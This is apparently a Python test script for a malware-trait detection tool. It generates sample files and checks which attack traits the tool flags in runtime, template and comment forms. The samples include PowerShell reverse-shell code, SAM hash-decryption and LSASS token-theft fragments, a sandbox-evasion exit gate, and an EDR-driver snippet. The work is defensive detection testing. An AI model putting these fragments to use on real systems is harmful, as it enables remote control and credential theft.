#!/usr/bin/env python3
"""Executable payloads versus quoted generators; source-reference boundaries.

Review evidence: the loader reconstruction decodes kernel32.dll and
GetVolumeInformationW, discards the resolved function, and sends fixed bytes.
Its credential paths are unused. Posh-SecMod's saved GitHub rawLines match
upstream 21e577ac4e1199aff6c4dd53b78ee15b6361dc9ce4e1b22db4b44f8db255797a
apart from a trailing newline. Its reverse-shell, SAM and SYSTEM-token routines
are output templates, not import-time execution. The installer downloads and
extracts the documented module. The EDR sample instead reaches its PID-to-IOCTL
loop directly from main; absent driver bytes limit verification of success.

Moves preserve source scopes and explicit consumers. Deliberate changes remove
unbound theft/obfuscation claims, distinguish parsed operations from quoted
source, and require device control for the broad EDR-killing claim. File-level
co-occurrence remains explicitly described as such. No product-name exception
is used. These controls test both sides of the changed boundaries.
"""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile

p = argparse.ArgumentParser()
p.add_argument('--cleave', default='cleave')
p.add_argument('--scratch', required=True)
a = p.parse_args()
root = Path(__file__).resolve().parents[2]
shell_id = 'objectives/command-and-control/reverse-shell/stream-bridge::powershell-tcpclient-shell-stream-bridge'
sam_id = 'objectives/credential-access/registry::powershell-sam-des-hash-decryption'
token_id = 'objectives/privilege-escalation/token-manipulation::powershell-lsass-thread-token-theft'
cache_id = 'objectives/anti-analysis/sandbox-detect/timing::cache-timing-cpuid-exit-gate'
shell = '''$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = $env:ComSpec
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
$encoding = New-Object System.Text.AsciiEncoding
$read = $stream.Read($networkbuffer,0,$networkbuffer.Length)
$string = $encoding.GetString($networkbuffer,0,$read)
$inputstream.write($string)
$out = $outputstream.ReadToEnd()
$stream.Write($encoding.GetBytes($out),0,$out.Length)
'''
sam = '''$k = Get-Item HKLM:\\SAM\\SAM\\Domains\\Account
$users = Get-ChildItem HKLM:\\SAM\\SAM\\Domains\\Account\\Users
$lsa = 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD'
$des = New-Object Security.Cryptography.DESCryptoServiceProvider
$transform = $des.CreateDecryptor()
$result = $transform.TransformFinalBlock($data, 0, $data.Length)
'''
token = '''$process = Get-Process -Name lsass
$h = $api::OpenProcessToken($process.Handle, 10, [ref]$token)
$d = $api::DuplicateToken($token, 2, [ref]$copy)
$s = $api::SetThreadToken([IntPtr]::Zero, $copy)
'''
cache = '''int main() {
 int cpu[4]; __cpuid(cpu, 1);
 long line[8]; _mm_clflush(line);
 unsigned long t = __rdtsc(); long x = line[0]; t = __rdtsc()-t;
 if (cpu[2] & (1 << 31)) { ExitProcess(0); }
 return 0;
}
'''
cases = []
for name, code, objective in [('shell', shell, shell_id), ('sam', sam, sam_id), ('token', token, token_id)]:
 cases += [(name+'-runtime.ps1', code, [objective], []),
           (name+'-template.ps1', "function Get-Script {\n$body = @'\n"+code+"'@\n$body\n}\n", [], [shell_id,sam_id,token_id]),
           (name+'-comment.ps1', '<#\n'+code+'#>\n', [], [shell_id,sam_id,token_id])]
cases += [
 ('byte-table.c', 'unsigned char table[] = {' + ','.join('0x%02x'%i for i in range(32)) + '};', ['metadata/lang/source/literal::portable-hex-byte-array-literal'], []),
 ('small-table.c', 'unsigned char table[] = {0x00,0x01};', [], ['metadata/lang/source/literal::portable-hex-byte-array-literal']),
 ('driver-name.c', 'const char *p = "PhantomKiller_variant.sys";', ['micro-behaviors/fs/path/system::bootrepair-phantom-processmonitor-sys-reference'], []),
 ('ordinary-driver.c', 'const char *p = "ordinary.sys";', [], ['micro-behaviors/fs/path/system::bootrepair-phantom-processmonitor-sys-reference']),
 ('dll-path.c', r'const char *p = "C:\\Vendor\\runtime.dll";', ['micro-behaviors/fs/path/library::windows-dll-file-path-reference'], []),
 ('data-path.c', r'const char *p = "C:\\Vendor\\runtime.dat";', [], ['micro-behaviors/fs/path/library::windows-dll-file-path-reference']),
 ('conditional-exit.c', cache, [cache_id], []),
 ('benchmark.c', cache.replace(' if (cpu[2] & (1 << 31)) { ExitProcess(0); }\n',''), [], [cache_id]),
 ('references.c', r'''int main() {
 const char *a = "%APPDATA%\\mRemoteNG\\confCons.xml";
 const char *b = "%APPDATA%\\FTPInfo";
 char data[] = "fixed configuration labels";
 RtlCompressBuffer(2, data, 26, packed, 100, 4096, &n, workspace);
 HttpSendRequestA(req, 0, 0, packed, n);
 return 0;
 }
 ''', ['micro-behaviors/fs/path/secret-config::remote-access-and-ftp-config-references'], []),
 ('driver-inventory.c', '''int main() {
 const char *driver = "C:\\\\drivers\\\\example.sys";
 const char *target = "MsMpEng.exe";
 CreateServiceW(scm, name, name, 0x10034u, 1u, 3u, 0, driver, 0,0,0,0,0);
 CreateFileW(L"\\\\\\\\.\\\\Example", GENERIC_READ, 0, 0, OPEN_EXISTING, 0,0);
 DeviceIoControl(device, 0x123456, 0,0,0,0,&n,0);
 }
 ''', ['micro-behaviors/os/kernel/device::driver-client-security-process-references'], ['objectives/impact/degrade/edr/teardown::edr-killer-behavior']),
 ('archive-installer.ps1', '''$webclient = New-Object System.Net.WebClient
$webclient.DownloadFile($url,$file)
$shell = New-Object -Com Shell.Application
$zip = $shell.Namespace($file)
$destination = $shell.Namespace($target)
$destination.CopyHere($zip.Items(), 0x10)
''', ['micro-behaviors/data/archive/extract/capability::powershell-http-shell-com-extraction'], []),
]
with tempfile.TemporaryDirectory(prefix='generated-review-', dir=a.scratch) as tmp:
 paths = []
 for name, code, _, _ in cases:
  path = Path(tmp)/name; path.write_text(code); paths.append(str(path))
 result = subprocess.run([a.cleave,'--traits-dir',str(root),'--format','json',*paths],capture_output=True,text=True)
 if result.returncode:
  raise SystemExit(result.stderr or result.stdout)
 reports = {}; decoder = json.JSONDecoder(); remaining = result.stdout
 while remaining.strip():
  report, end = decoder.raw_decode(remaining.lstrip()); remaining = remaining.lstrip()[end:]
  for file in report['files']: reports[Path(file['path']).name] = file
 for name, _, required, forbidden in cases:
  file = reports[name]; found = {t['id'] for t in file.get('traits',[])}
  assert set(required) <= found, (name,'missing',set(required)-found)
  assert not set(forbidden)&found, (name,'unexpected',set(forbidden)&found)
  if name.endswith(('template.ps1','comment.ps1')) or name in ['references.c','benchmark.c','driver-inventory.c','archive-installer.ps1']:
   assert not [t for t in file.get('traits',[]) if t['crit']>=5], (name,'unexpected hostile')
  print('PASS',name)
